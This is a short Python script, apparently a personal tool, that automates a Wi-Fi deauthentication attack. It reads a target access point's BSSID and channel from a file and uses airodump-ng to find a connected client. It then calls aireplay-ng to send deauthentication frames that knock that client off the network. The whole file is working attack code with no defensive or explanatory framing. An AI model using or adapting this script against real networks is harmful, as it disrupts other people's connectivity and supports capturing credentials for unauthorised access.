#!/usr/bin/python3

import subprocess
import time
import sys

iface = 'wlp2s0mon'
bssid = subprocess.check_output('head -n 1 session-bssid.txt', shell=True, text=True).strip()
channel = int(subprocess.check_output('tail -n 1 session-bssid.txt', shell=True, text=True))
try:
    print('Ctrl C once client appears...')
    subprocess.run(f"sudo xterm -e 'sudo airodump-ng --bssid {bssid} -c {channel} {iface} -w deauthsession'", shell=True, timeout=15)
    client = subprocess.check_output("grep ':' deauthsession-01.csv | sed '2!d' | cut -c 1-17", shell=True, text=True).strip()
    #print(f'{client}')
    time.sleep(7)
    subprocess.run(f"sudo airmon-ng start {iface} {channel}", shell=True)
    subprocess.run(f"xterm -e 'sudo aireplay-ng --deauth 3 -a {bssid} -c {client} {iface}'", shell=True, timeout=15)
except subprocess.TimeoutExpired:
    sys.exit(1)
